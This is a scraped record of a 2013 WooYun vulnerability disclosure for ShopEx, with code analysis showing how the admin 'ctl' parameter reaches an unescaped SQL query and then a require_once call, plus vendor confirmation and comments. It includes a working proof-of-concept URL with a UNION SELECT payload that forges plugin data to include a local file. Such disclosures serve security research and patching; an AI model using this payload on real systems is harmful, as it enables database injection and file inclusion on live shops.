{"id": 9428, "wybug_id": "wooyun-2013-026912", "wybug_title": "shopex注入并导致任意文件包含", "wybug_corp": "ShopEx", "wybug_author": "Code_Sec", "wybug_date": "2013-06-26 10:16", "wybug_open_date": "2013-09-24 10:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-08-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-24：\t细节向公众公开  简要描述： sql注入，无连载 详细说明：  shopex后台登陆地址：http://127.0.0.1/shopadmin/index.php?ctl=passport&act=login分析代码：\\core\\include_v5\\adminCore.php\npublic function adminCore( )......$mod = $_GET['ctl'] ? $_GET['ctl'] : \"default\";......$controller =& $this->getController( $mod );\n$mod就是我们提交的变量ctl在下面找到函数getController：\npublic function &getController( $mod, $args = null )\t\t\t\t{\t\t\t\t\t\t\t\tif ( !class_exists( \"pageFactory\" ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\trequire( \"pageFactory.php\" );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t$baseName = basename( $mod, $args );\t\t\t\t\t\t\t\t$dirName = dirname( $mod );\t\t\t\t\t\t\t\tif ( $dirName == \"plugins\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$addon =& $this->loadModel( \"system/addons\" );\t\t\t\t\t\t\t\t\t\t\t\t$object =& $addon->load( $baseName, \"admin\" );\t\t\t\t\t\t\t\t\t\t\t\t$object->db =& $this->database( );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$fname = CORE_DIR.\"/admin/controller/\".$dirName.\"/ctl.\".$baseName.\".php\";\n关键逻辑：if ( $dirName == \"plugins\" )$addon =& $this->loadModel( \"system/addons\" );\t\t\t\t\t\t\t\t\t$object =& $addon->load( $baseName, \"admin\" );在文件\\core\\model_v5\\system\\mdl.addons.php中：\npublic function &load( $name, $type )\t\t\t\t{\t\t\t\t\t\t\t\tif ( ( $type == \"app\" || $type == \"shop\" || $type == \"admin\" ) && !class_exists( \"app\" ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\trequire( \"app.php\" );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t$data = $this->db->selectrow( \"SELECT plugin_id,plugin_path,plugin_struct,plugin_config,plugin_base FROM sdb_plugins WHERE plugin_type='{$type}' AND plugin_ident='{$name}'\" );\t\t\t\t\t\t\t\treturn $this->plugin_instance( $data );\t\t\t\t}\n最终我们提交的变量ctl变成变量：$name，而且shopex已经对变量做过反转义了。这里可以形成sql注入漏洞，继续看plugin_instance( $data )\npublic function plugin_instance( $data )\t\t\t\t{\t\t\t\t\t\t\t\t$sturct = unserialize( $data['plugin_struct'] );\t\t\t\t\t\t\t\t$classname = $sturct['class_name'];\t\t\t\t\t\t\t\tif ( !$classname )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\treturn false;\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\tif ( $data['plugin_base'] == 0 )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tif ( file_exists( PLUGIN_DIR.$data['plugin_path'] ) )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\trequire_once( PLUGIN_DIR.$data['plugin_path'] );\nrequire_once( PLUGIN_DIR.$data['plugin_path'] );，因为存在sql注入漏洞，所以所有的变量$data我们都是可以控制的。   漏洞证明：  http://127.0.0.1/shopadmin/index.php?ctl=plugins/pp.php%27\n\n本地文件包含./../readme.txthttp://127.0.0.1/shopadmin/index.php?ctl=plugins/pp.php%27%20and%201=2%20union%20select%20plugin_id,0x2E2F2E2E2F726561646D652E747874%20as%20plugin_path,%27s:5:%22funcs%22;a:9:{s:13:%22action_member%22;s:13:%22action_member%22;s:7:%22actions%22;s:7:%22actions%22;s:8:%22changelv%22;s:8:%22changelv%22;s:8:%22addpoint%22;s:8:%22addpoint%22;s:8:%22delpoint%22;s:8:%22delpoint%22;s:10:%22addadvance%22;s:10:%22addadvance%22;s:10:%22deladvance%22;s:10:%22deladvance%22;s:10:%22sendcoupon%22;s:10:%22sendcoupon%22;s:6:%22settag%22;s:6:%22settag%22;}}%27%20as%20plugin_struct,plugin_config,0%20as%20plugin_base%20FROM%20sdb_plugins%20limit%201%23\n\n   修复方案：  过滤、权限判断等等   版权声明：转载请注明来源 Code_Sec@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-06-26 11:42 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-26 10:17 |    \t\tAepl│恋爱 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:15        | Forzen恋爱-不要做你的Guest 只想做的你adm...)\t\t \n  主站程序的？    \n     2013-06-26 11:28 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Aepl│恋爱 目测是的    \n     2013-06-26 13:35 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @xsser 你确定是目测？嘎嘎。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}